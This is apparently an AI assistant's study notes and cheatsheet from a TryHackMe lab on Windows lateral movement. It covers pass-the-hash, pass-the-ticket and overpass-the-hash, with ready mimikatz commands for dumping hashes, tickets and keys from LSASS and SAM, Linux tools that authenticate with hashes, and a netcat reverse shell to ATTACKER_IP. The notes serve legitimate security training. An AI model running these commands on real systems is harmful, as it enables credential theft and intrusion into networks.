
## 💻 Lecture Breakdown: Alternate Authentication Material

The core concept is to use **alternate authentication material** (like NTLM hashes or Kerberos tickets) to access a Windows account when the plaintext password isn't known. This exploits how Windows network authentication protocols work.

### 1. NTLM Authentication

NTLM (New Technology LAN Manager) is a suite of security protocols. The authentication process is a **challenge-response** mechanism.

#### NTLM Authentication Process (Domain Account)

1. **Client Request:** The client sends an authentication request to the server.
    
2. **Server Challenge:** The server generates a random number (the **challenge**) and sends it to the client.
    
3. **Client Response:** The client combines their **NTLM password hash** with the challenge to generate a **response** and sends it back.
    
4. **Verification Request:** The server forwards both the challenge and the response to the **Domain Controller (DC)**.
    
5. **DC Verification:** The DC uses the client's stored password hash to recalculate the expected response and compares it to the client's response.
    
6. **Authentication Result:** If they match, the client is authenticated. The result is sent back to the server, then to the client.
    

#### Pass-the-Hash (PtH)

- **Vulnerability:** Since the client only needs the **NTLM password hash** (not the plaintext password) to calculate the correct challenge response, an attacker with the hash can successfully authenticate.
    
- **Technique:** **Pass-the-Hash (PtH)** is the act of using the NTLM hash directly to authenticate.
    
- **Extraction:** NTLM hashes can be extracted using tools like **mimikatz**:
    
    - **From Local SAM:** `lsadump::sam` (Only local users).
        
    - **From LSASS Memory:** `sekurlsa::msv` (Local and recently logged-on domain users).
        
- **Execution (using mimikatz):**
    
    - `sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:"COMMAND"`
        
    - This injects an access token using the hash and executes a command (e.g., a reverse shell) as the victim user.
        

#### PtH using Linux Tools

Linux tools can also perform PtH for various services:

- **RDP:** `xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`
    
- **psexec:** `psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`
    
- **WinRM:** `evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`
    

---

### 2. Kerberos Authentication

Kerberos is a more complex protocol that uses a **Key Distribution Center (KDC)** (usually the Domain Controller) to issue tickets.

#### Kerberos Authentication Process

1. **TGT Request:** The user sends their username and a timestamp (encrypted with a key derived from their password) to the **KDC**.
    
2. **TGT Grant:** The KDC sends back a **Ticket Granting Ticket (TGT)** and a **Session Key**.
    
    - The **TGT** is encrypted with the `krbtgt` account's hash and allows the user to request service tickets.
        
3. **TGS Request:** To access a service (e.g., a file share), the user sends the **TGT**, a timestamp (encrypted with the Session Key), and a **Service Principal Name (SPN)** to the KDC.
    
4. **TGS Grant:** The KDC sends back a **Ticket Granting Service (TGS)** and a **Service Session Key**.
    
    - The **TGS** is encrypted with the **Service Owner Hash** (the account running the service).
        
5. **Service Authentication:** The user presents the **TGS** to the target service. The service uses its owner's hash to decrypt the TGS and authenticate the user.
    

#### Pass-the-Ticket (PtT)

- **Vulnerability:** If an attacker can extract a user's Kerberos tickets and the corresponding session keys from memory, they can re-use these tickets to access services without the password.
    
- **Technique:** **Pass-the-Ticket (PtT)** is the act of injecting extracted Kerberos tickets into the current session.
    
- **Extraction:** Tickets and Session Keys can be extracted from LSASS memory using **mimikatz** (often requires SYSTEM privileges for TGTs):
    
    - `sekurlsa::tickets /export`
        
- **Execution (using mimikatz):**
    
    - `kerberos::ptt [TICKET_FILE_NAME].kirbi`
        
    - Tickets are then available to any tools used for lateral movement (checked with the `klist` command).
        

#### Overpass-the-Hash / Pass-the-Key (OPtH / PtK)

- **Vulnerability:** The initial TGT request sends a timestamp encrypted with an encryption key derived from the user's password (RC4, AES128, or AES256). If an attacker has this key, they can generate the request and get a TGT without the password.
    
- **Technique:** **Pass-the-Key (PtK)** uses the Kerberos encryption keys to request a TGT.
    
    - If the **RC4 key** is used, this is specifically known as **Overpass-the-Hash (OPtH)** because the RC4 key is equivalent to the **NTLM hash**.
        
- **Extraction:** Kerberos keys can be extracted from LSASS memory using **mimikatz**:
    
    - `sekurlsa::ekeys`
        
- **Execution (using mimikatz):**
    
    - `sekurlsa::pth /user:USER /domain:DOMAIN /rc4:RC4_KEY /run:"COMMAND"` (for OPtH)
        
    - Similar commands are used with `/aes128:` or `/aes256:` keys.
        

---

## 📝 Obsidian Style Note: Windows Lateral Movement Cheatsheet

### 🗺️ Alternate Authentication: Lateral Movement

**Goal:** Access a Windows account/service without the plaintext password by using extracted credential material.

| **Protocol** | **Alternate Material**                   | **Attack Name**                                       | **Extraction Tool/Method**                     |
| ------------ | ---------------------------------------- | ----------------------------------------------------- | ---------------------------------------------- |
| **NTLM**     | NTLM Password Hash                       | **Pass-the-Hash (PtH)**                               | `mimikatz` (`sekurlsa::msv` or `lsadump::sam`) |
| **Kerberos** | TGT/TGS + Session Key                    | **Pass-the-Ticket (PtT)**                             | `mimikatz` (`sekurlsa::tickets /export`)       |
| **Kerberos** | Kerberos Encryption Key (e.g., RC4, AES) | **Pass-the-Key (PtK)** / **Overpass-the-Hash (OPtH)** | `mimikatz` (`sekurlsa::ekeys`)                 |

---

### 🔑 NTLM - Pass-the-Hash (PtH)

The NTLM challenge-response protocol allows authentication using only the **NTLM hash**.

#### 1. Extraction (mimikatz)

- **Local Users (SAM):**
    
    PowerShell
    
    ```
    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # lsadump::sam 
    ```
    
- **Domain Users (LSASS Memory):**
    
    PowerShell
    
    ```
    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # sekurlsa::msv 
    ```
    

#### 2. Execution (mimikatz - Inject and Run)

- Spawns a new process (e.g., reverse shell) using the injected hash credentials.
    
- **Note:** Must use `token::revert` if currently elevated, as PtH won't work with an elevated token.
    
    PowerShell
    
    ```
    mimikatz # token::revert
    mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
    ```
    

#### 3. Linux PtH Tools

| **Service** | **Command**                                              |
| ----------- | -------------------------------------------------------- |
| **RDP**     | `xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH` |
| **psexec**  | `psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`    |
| **WinRM**   | `evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`         |

---

### 🎫 Kerberos - Pass-the-Ticket (PtT)

Involves extracting a **TGT** (Ticket Granting Ticket) or **TGS** (Ticket Granting Service) and its corresponding **Session Key** from LSASS memory. TGTs are more valuable as they allow requesting access to _any_ permitted service.

#### 1. Extraction (mimikatz)

- **Prerequisite:** Often requires `SYSTEM` privileges for TGTs.
    
    PowerShell
    
    ```
    mimikatz # privilege::debug
    mimikatz # sekurlsa::tickets /export
    ```
    

#### 2. Execution (mimikatz - Inject Ticket)

- Injects the extracted `.kirbi` ticket file into the current session.
    
    PowerShell
    
    ```
    mimikatz # kerberos::ptt [TICKET_FILE_NAME].kirbi
    ```
    
- **Verification:** `klist` on the target machine.
    

---

### 🔑 Kerberos - Pass-the-Key (PtK) / Overpass-the-Hash (OPtH)

Uses the Kerberos encryption keys to request a new TGT from the KDC.

#### 1. Key Extraction (mimikatz)

- Extracts the user's RC4, AES128, or AES256 encryption keys from LSASS.
    
    PowerShell
    
    ```
    mimikatz # privilege::debug
    mimikatz # sekurlsa::ekeys
    ```
    

#### 2. Execution (mimikatz - PtK/OPtH)

- **OPtH (using RC4/NTLM hash):**
    
    PowerShell
    
    ```
    mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:RC4_HASH /run:"..."
    ```
    
- **PtK (using AES keys):**
    
    PowerShell
    
    ```
    mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:AES256_KEY /run:"..."
    ```
    

Would you like a deeper dive into one of these specific attack techniques, or perhaps an explanation of the underlying security implications?